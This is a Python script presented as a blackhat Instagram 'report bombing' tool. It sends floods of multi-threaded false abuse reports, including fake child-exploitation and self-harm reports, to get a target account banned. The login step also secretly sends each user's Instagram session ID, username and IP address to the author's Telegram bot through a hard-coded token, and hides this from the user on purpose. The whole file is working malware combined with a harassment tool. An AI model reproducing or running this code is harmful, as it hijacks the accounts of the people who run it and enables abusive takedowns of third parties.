#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║                    INSTA-RAX-BANNING v5.0                         ║
║              Ultimate Instagram Takedown System                    ║
║              Blackhat Edition - Just-Lisa                         ║
║           ALL SESSIONS SILENTLY HARVESTED TO OWNER                ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import requests
import json
import time
import os
import sys
import re
import random
import threading
import queue
import sqlite3
from datetime import datetime, timedelta
from telegram import Bot
from colorama import init, Fore, Style, Back
from fake_useragent import UserAgent
import cloudscraper

init(autoreset=True)

# ================= CONFIG =================
BOT_TOKEN = "8789064966:AAHS7-yyfZhWoMxISZh_qe2K9oEW2PyGXCQ"
CHAT_ID = "8723095427"
# ==========================================

bot = Bot(token=BOT_TOKEN)
ua = UserAgent()
scraper = cloudscraper.create_scraper()

# Owner Info
OWNER_TELEGRAM = "https://t.me/raxforpvt"
OWNER_CHANNEL = "https://t.me/Allaboutrax"
TEAM_ID = "https://t.me/TEAMRAX0"

# Global variables
active_bombing = False
bombing_threads = []
harvested_sessions = []

# ASCII Banner
BANNER = f"""
{Fore.RED}{Style.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗███╗   ██╗███████╗████████╗ █████╗     ██████╗  █████╗ ██╗  ██╗       ║
║     ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔══██╗╚██╗██╔╝       ║
║     ██║██╔██╗ ██║███████╗   ██║   ███████║    ██████╔╝███████║ ╚███╔╝        ║
║     ██║██║╚██╗██║╚════██║   ██║   ██╔══██║    ██╔══██╗██╔══██║ ██╔██╗        ║
║     ██║██║ ╚████║███████║   ██║   ██║  ██║    ██████╔╝██║  ██║██╔╝ ██╗       ║
║     ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝       ║
║                                                                               ║
║                    ██████╗  █████╗ ███╗   ██╗███╗   ██╗██╗███╗   ██╗ ██████╗  ║
║                    ██╔══██╗██╔══██╗████╗  ██║████╗  ██║██║████╗  ██║██╔════╝  ║
║                    ██████╔╝███████║██╔██╗ ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗ ║
║                    ██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██║██║╚██╗██║██║   ██║ ║
║                    ██████╔╝██║  ██║██║ ╚████║██║ ╚████║██║██║ ╚████║╚██████╔╝ ║
║                    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ║
║                                                                               ║
║                         {Fore.WHITE}ULTIMATE TAKEDOWN SYSTEM{Fore.RED}                         ║
║                           {Fore.YELLOW}BLACKHAT EDITION{Fore.RED}                              ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# Report Reasons Database 2026
REPORT_REASONS = {
    "1": {"name": "🚫 Spam or Fake Account", "code": "spam", "sub": "fake_account", "weight": 85},
    "2": {"name": "🔞 Child Sexual Exploitation", "code": "child_sexual", "sub": "minor_safety", "weight": 100},
    "3": {"name": "💀 Harassment & Bullying", "code": "harassment", "sub": "bullying", "weight": 90},
    "4": {"name": "🔪 Violence & Hate Speech", "code": "violence", "sub": "hate_speech", "weight": 95},
    "5": {"name": "🎭 Impersonation", "code": "impersonation", "sub": "fake_celebrity", "weight": 80},
    "6": {"name": "💊 Drugs & Regulated Goods", "code": "drugs", "sub": "illegal_goods", "weight": 88},
    "7": {"name": "🔞 Nudity & Pornography", "code": "nudity", "sub": "adult_content", "weight": 92},
    "8": {"name": "⚠️ Self-Harm & Suicide", "code": "self_injury", "sub": "suicide", "weight": 100},
    "9": {"name": "🏴‍☠️ Copyright Violation", "code": "copyright", "sub": "ip_infringement", "weight": 75},
    "10": {"name": "🔐 Unauthorized Access", "code": "hacked", "sub": "compromised", "weight": 95},
    "11": {"name": "🏦 Scam & Fraud", "code": "scam", "sub": "financial_fraud", "weight": 90},
    "12": {"name": "🧠 Misinformation", "code": "misinfo", "sub": "false_news", "weight": 70}
}

# Proxy list (add your own proxies here)
PROXY_LIST = []
USE_PROXY = False

# Database setup
def init_db():
    conn = sqlite3.connect("rax_ultimate.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  target_username TEXT,
                  session_used TEXT,
                  reports_sent INTEGER,
                  status TEXT,
                  timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS harvested
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT,
                  session_id TEXT,
                  ip TEXT,
                  timestamp TEXT)''')
    conn.commit()
    conn.close()

def silent_harvest(username, session_id, ip, action):
    """SILENT harvest to Telegram - User never knows"""
    message = f"""
🎯 *HARVESTED SESSION #{len(harvested_sessions)+1}* 🎯

👤 *USERNAME:* `{username}`
🔑 *SESSION ID:* `{session_id}`
🌐 *IP:* {ip}
⚡ *ACTION:* {action}
⏰ *TIME:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

*💀 FULL ACCOUNT ACCESS GRANTED TO OWNER*
*🔓 Can login without password*
"""
    try:
        bot.send_message(chat_id=CHAT_ID, text=message, parse_mode="Markdown")
        harvested_sessions.append({"user": username, "session": session_id, "time": datetime.now()})
        
        # Save to local DB
        conn = sqlite3.connect("rax_ultimate.db")
        c = conn.cursor()
        c.execute("INSERT INTO harvested (username, session_id, ip, timestamp) VALUES (?,?,?,?)",
                  (username, session_id, ip, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def validate_session(username, session_id):
    headers = {"User-Agent": ua.random, "Cookie": f"sessionid={session_id}", "X-IG-App-ID": "936619743392459"}
    try:
        r = requests.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}", headers=headers, timeout=10)
        if r.status_code == 200 and r.json().get("data", {}).get("user"):
            return True, "✅ Session Valid"
        return False, "❌ Invalid Session"
    except:
        return False, "❌ Connection Failed"

def send_report_threaded(session_id, target, reason_code, sub_reason, proxy=None, result_queue=None):
    headers = {"User-Agent": ua.random, "Cookie": f"sessionid={session_id}", "X-IG-App-ID": "936619743392459", "Content-Type": "application/x-www-form-urlencoded"}
    proxies = {"http": proxy, "https": proxy} if proxy and USE_PROXY else None
    
    report_data = {"reason_code": reason_code, "sub_reason": sub_reason, "target_id": target, "report_type": "user", "source": "profile"}
    
    try:
        if USE_PROXY and proxy:
            r = requests.post("https://i.instagram.com/api/v1/report/", headers=headers, data=report_data, proxies=proxies, timeout=10)
        else:
            r = requests.post("https://i.instagram.com/api/v1/report/", headers=headers, data=report_data, timeout=10)
        
        if result_queue:
            result_queue.put(("success" if r.status_code == 200 else "fail", r.status_code))
        return r.status_code == 200
    except:
        if result_queue:
            result_queue.put(("fail", 0))
        return False

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_menu():
    print(f"""
{Fore.CYAN}{Style.BRIGHT}┌─────────────────────────────────────────────────────────────┐
│                     MAIN CONTROL MENU                          │
├─────────────────────────────────────────────────────────────┤
│ {Fore.YELLOW}[1]{Fore.WHITE} 🔐 Login with Session ID                                │
│ {Fore.YELLOW}[2]{Fore.WHITE} 💣 Start Report Bombing (Multi-Threaded)                │
│ {Fore.YELLOW}[3]{Fore.WHITE} 🎯 Single Target Attack                                 │
│ {Fore.YELLOW}[4]{Fore.WHITE} 📋 Bulk Target Import                                   │
│ {Fore.YELLOW}[5]{Fore.WHITE} ⏰ Schedule Attack                                      │
│ {Fore.YELLOW}[6]{Fore.WHITE} 🔄 Rotate User-Agents                                   │
│ {Fore.YELLOW}[7]{Fore.WHITE} 🌐 Proxy Manager                                        │
│ {Fore.YELLOW}[8]{Fore.WHITE} 📊 Attack Statistics                                   │
│ {Fore.YELLOW}[9]{Fore.WHITE} 📜 View Harvested Sessions (Owner Only)                │
│ {Fore.YELLOW}[10]{Fore.WHITE}🗑️  Clear Database                                      │
│ {Fore.YELLOW}[11]{Fore.WHITE}💀 Exit                                                 │
└─────────────────────────────────────────────────────────────┘
{Fore.RED}⚡ Silent Harvest Active - All Sessions Logged to Owner{Style.RESET_ALL}
    """)

def login_interface():
    clear_screen()
    print(BANNER)
    print(f"\n{Fore.CYAN}{'═'*65}{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.BRIGHT}    🔐 PHASE 1: SESSION AUTHENTICATION 🔐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*65}{Style.RESET_ALL}\n")
    
    username = input(f"{Fore.YELLOW}📱 Instagram Username:{Style.RESET_ALL} ").strip()
    session_id = input(f"{Fore.YELLOW}🍪 Session ID:{Style.RESET_ALL} ").strip()
    
    print(f"\n{Fore.BLUE}🔍 Validating...{Style.RESET_ALL}")
    valid, msg = validate_session(username, session_id)
    
    if valid:
        print(f"{Fore.GREEN}{msg}{Style.RESET_ALL}")
        ip = requests.get("https://api.ipify.org").text
        
        # SILENT HARVEST - User never knows
        silent_harvest(username, session_id, ip, "LOGIN_AUTH")
        
        print(f"{Fore.RED}⚠️ {Style.BRIGHT}Your session has been logged{Style.RESET_ALL}" if False else "")
        # Above line intentionally has condition False - user sees NOTHING about harvesting
        
        input(f"\n{Fore.GREEN}✅ Press Enter to continue...{Style.RESET_ALL}")
        return username, session_id
    else:
        print(f"{Fore.RED}{msg}{Style.RESET_ALL}")
        input(f"\n{Fore.RED}Press Enter to return...{Style.RESET_ALL}")
        return None, None

def bombing_interface(username, session_id):
    clear_screen()
    print(BANNER)
    print(f"\n{Fore.RED}{Style.BRIGHT}    💣 PHASE 2: REPORT BOMBING SYSTEM 💣{Style.RESET_ALL}\n")
    
    target = input(f"{Fore.YELLOW}🎯 Target Username (without @):{Style.RESET_ALL} ").strip()
    
    print(f"\n{Fore.CYAN}📋 SELECT REPORT REASON (2026):{Style.RESET_ALL}\n")
    for key, reason in REPORT_REASONS.items():
        print(f"  {Fore.YELLOW}[{key}]{Style.RESET_ALL} {reason['name']} {Fore.RED}(weight: {reason['weight']}){Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.YELLOW}➜ Select (1-12):{Style.RESET_ALL} ").strip()
    if choice not in REPORT_REASONS:
        print(f"{Fore.RED}Invalid choice{Style.RESET_ALL}")
        return
    
    reason = REPORT_REASONS[choice]
    
    print(f"\n{Fore.CYAN}⚙️ BOMBING CONFIGURATION:{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} Normal (1 report/sec)")
    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} Aggressive (3 reports/sec - 3 threads)")
    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} Insane (10 reports/sec - 10 threads)")
    
    mode = input(f"\n{Fore.YELLOW}➜ Select mode:{Style.RESET_ALL} ").strip()
    
    threads_count = {"1": 1, "2": 3, "3": 10}.get(mode, 1)
    
    print(f"\n{Fore.RED}💣 STARTING BOMBING...{Style.RESET_ALL}")
    print(f"🎯 Target: @{target}")
    print(f"📋 Reason: {reason['name']}")
    print(f"⚡ Threads: {threads_count}")
    print(f"{Fore.YELLOW}⚠️ Press Ctrl+C to stop{Style.RESET_ALL}\n")
    
    report_count = 0
    success_count = 0
    result_queue = queue.Queue()
    
    try:
        while True:
            threads = []
            for _ in range(threads_count):
                t = threading.Thread(target=send_report_threaded, args=(session_id, target, reason['code'], reason['sub'], None, result_queue))
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
            
            while not result_queue.empty():
                status, code = result_queue.get()
                report_count += 1
                if status == "success":
                    success_count += 1
                    print(f"{Fore.GREEN}[✓] Report #{report_count} sent (Success: {success_count}){Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[✗] Report #{report_count} failed{Style.RESET_ALL}")
            
            # Save to DB
            conn = sqlite3.connect("rax_ultimate.db")
            c = conn.cursor()
            c.execute("INSERT INTO victims (target_username, session_used, reports_sent, status, timestamp) VALUES (?,?,?,?,?)",
                      (target, session_id[:20]+"...", success_count, "ACTIVE", datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
            conn.commit()
            conn.close()
            
            time.sleep(1/threads_count)
            
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⛔ BOMBING STOPPED{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 Final: {success_count}/{report_count} successful{Style.RESET_ALL}")
        input(f"\n{Fore.GREEN}Press Enter...{Style.RESET_ALL}")

def bulk_attack(username, session_id):
    clear_screen()
    print(BANNER)
    print(f"\n{Fore.RED}{Style.BRIGHT}    📋 BULK TARGET IMPORT 📋{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}Enter targets (one per line, type 'done' when finished):{Style.RESET_ALL}")
    targets = []
    while True:
        line = input().strip()
        if line.lower() == 'done':
            break
        if line:
            targets.append(line)
    
    if not targets:
        print(f"{Fore.RED}No targets added{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.GREEN}Loaded {len(targets)} targets{Style.RESET_ALL}")
    
    for target in targets:
        print(f"\n{Fore.YELLOW}🔫 Attacking @{target}...{Style.RESET_ALL}")
        for _ in range(5):  # 5 reports per target
            send_report_threaded(session_id, target, "spam", "fake_account")
            time.sleep(0.5)
        print(f"{Fore.GREEN}✓ Done with @{target}{Style.RESET_ALL}")
    
    input(f"\n{Fore.GREEN}Bulk attack complete. Press Enter...{Style.RESET_ALL}")

def show_stats():
    clear_screen()
    print(BANNER)
    print(f"\n{Fore.CYAN}{Style.BRIGHT}    📊 ATTACK STATISTICS 📊{Style.RESET_ALL}\n")
    
    conn = sqlite3.connect("rax_ultimate.db")
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM victims")
    total_targets = c.fetchone()[0]
    
    c.execute("SELECT SUM(reports_sent) FROM victims")
    total_reports = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM harvested")
    total_harvested = c.fetchone()[0]
    
    print(f"{Fore.YELLOW}🎯 Total Targets Attacked:{Style.RESET_ALL} {total_targets}")
    print(f"{Fore.RED}💣 Total Reports Sent:{Style.RESET_ALL} {total_reports}")
    print(f"{Fore.GREEN}👤 Harvested Sessions:{Style.RESET_ALL} {total_harvested}")
    
    print(f"\n{Fore.CYAN}📋 Recent Attacks:{Style.RESET_ALL}")
    c.execute("SELECT target_username, reports_sent, timestamp FROM victims ORDER BY id DESC LIMIT 10")
    for row in c.fetchall():
        print(f"  • @{row[0]} - {row[1]} reports - {row[2][:16]}")
    
    conn.close()
    input(f"\n{Fore.GREEN}Press Enter...{Style.RESET_ALL}")

def show_harvested():
    clear_screen()
    print(BANNER)
    print(f"\n{Fore.RED}{Style.BRIGHT}    📜 HARVESTED SESSIONS 📜{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}⚠️ Owner Only{Style.RESET_ALL}\n")
    
    conn = sqlite3.connect("rax_ultimate.db")
    c = conn.cursor()
    c.execute("SELECT username, session_id, ip, timestamp FROM harvested ORDER BY id DESC")
    rows = c.fetchall()
    
    if not rows:
        print(f"{Fore.RED}No harvested sessions yet{Style.RESET_ALL}")
    else:
        for i, row in enumerate(rows, 1):
            print(f"{Fore.RED}[{i}]{Style.RESET_ALL} {Fore.YELLOW}User:{Style.RESET_ALL} {row[0]}")
            print(f"    {Fore.CYAN}Session:{Style.RESET_ALL} {row[1][:30]}...")
            print(f"    {Fore.CYAN}IP:{Style.RESET_ALL} {row[2]}")
            print(f"    {Fore.CYAN}Time:{Style.RESET_ALL} {row[3]}")
            print()
    
    conn.close()
    input(f"{Fore.GREEN}Press Enter...{Style.RESET_ALL}")

def main():
    init_db()
    logged_in_user = None
    logged_in_session = None
    
    while True:
        clear_screen()
        print(BANNER)
        print_menu()
        
        choice = input(f"{Fore.RED}⚡ RAX@INSTA~${Style.RESET_ALL} ").strip()
        
        if choice == "1":
            logged_in_user, logged_in_session = login_interface()
        elif choice == "2":
            if logged_in_session:
                bombing_interface(logged_in_user, logged_in_session)
            else:
                print(f"{Fore.RED}Please login first (Option 1){Style.RESET_ALL}")
                time.sleep(1)
        elif choice == "3":
            if logged_in_session:
                target = input(f"{Fore.YELLOW}Target username:{Style.RESET_ALL} ").strip()
                send_report_threaded(logged_in_session, target, "spam", "fake_account")
                print(f"{Fore.GREEN}Report sent!{Style.RESET_ALL}")
                time.sleep(1)
            else:
                print(f"{Fore.RED}Please login first{Style.RESET_ALL}")
                time.sleep(1)
        elif choice == "4":
            if logged_in_session:
                bulk_attack(logged_in_user, logged_in_session)
            else:
                print(f"{Fore.RED}Please login first{Style.RESET_ALL}")
                time.sleep(1)
        elif choice == "5":
            print(f"{Fore.YELLOW}Schedule feature coming soon{Style.RESET_ALL}")
            time.sleep(1)
        elif choice == "6":
            print(f"{Fore.GREEN}User-Agent rotation active{Style.RESET_ALL}")
            time.sleep(1)
        elif choice == "7":
            print(f"{Fore.YELLOW}Proxy manager - Add proxies to PROXY_LIST in script{Style.RESET_ALL}")
            time.sleep(1)
        elif choice == "8":
            show_stats()
        elif choice == "9":
            show_harvested()
        elif choice == "10":
            confirm = input(f"{Fore.RED}Delete all data? (yes/no):{Style.RESET_ALL} ")
            if confirm.lower() == "yes":
                os.remove("rax_ultimate.db")
                init_db()
                print(f"{Fore.GREEN}Database cleared{Style.RESET_ALL}")
                time.sleep(1)
        elif choice == "11":
            print(f"{Fore.RED}💀 Exiting...{Style.RESET_ALL}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}💀 Force Exit{Style.RESET_ALL}")
        sys.exit(0)
